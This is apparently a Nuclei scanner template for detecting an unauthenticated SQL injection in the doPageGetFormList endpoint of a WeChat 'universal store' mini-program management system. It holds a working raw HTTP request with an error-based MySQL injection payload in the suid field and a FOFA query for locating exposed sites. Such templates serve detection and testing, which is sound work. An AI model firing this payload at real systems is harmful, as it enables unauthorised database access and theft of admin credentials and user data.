id: wechat-stroe-app-dopagegetformlist-sqli

info:
  name: 微信万能门店小程序系统 doPageGetFormList - SQL注入漏洞
  author: qwtd
  severity: high
  description: 万能门店小程序管理系统 doPageGetFormList 存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 此漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
  metadata:
    max-request: 1
    fofa-query: "/comhome/cases/index.html"
    verified: true
  tags: 微信万能门店小程序系统

http:
  - raw:
      - |
        POST /api/wxapps/doPageGetFormList HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
        Accept-Encoding: gzip, deflate, br, zstd
        Accept-Language: zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7
        Connection: keep-alive
        Content-Type: application/x-www-form-urlencoded


        suid=' AND GTID_SUBSET(CONCAT((SELECT (VERSION()))),1)-- bdmV

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "SQLSTATE"
      - type: status
        status:
          - 500